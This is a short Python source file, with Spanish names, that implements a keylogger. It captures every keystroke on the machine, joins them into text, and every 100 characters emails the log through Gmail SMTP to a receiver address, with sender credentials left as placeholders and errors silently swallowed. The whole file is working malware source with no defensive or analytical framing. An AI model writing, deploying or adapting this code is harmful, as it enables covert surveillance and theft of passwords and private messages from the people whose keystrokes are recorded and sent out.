import keyboard as key
import datetime, smtplib
    
def Registrador():
    
    text = ''

    while True:

        recorder = str(key.read_event())

        if recorder.__contains__('down'):
            
            recorder = recorder.replace('KeyboardEvent(', '')
            recorder = recorder.replace('down)', '')
            recorder = recorder.replace('space', ' ')
            recorder = recorder.replace('enter', '\n')
            recorder = recorder.replace('back', '%BORRAR%')

            text += recorder
            
            if len(text) == 100:

                try:

                    time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    subject = 'Registrado a las: {}'.format(time)
                    message = 'Subject: {}\n\n{}'.format(subject, text)

                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    server.starttls()
                    server.login('email-emitente', 'contraseña')

                    server.sendmail('email-emitente', 'email-receptor', message)
                    server.quit()

                    text = ''

                except: 
                    pass

if __name__ == '__main__':
    
    Registrador()
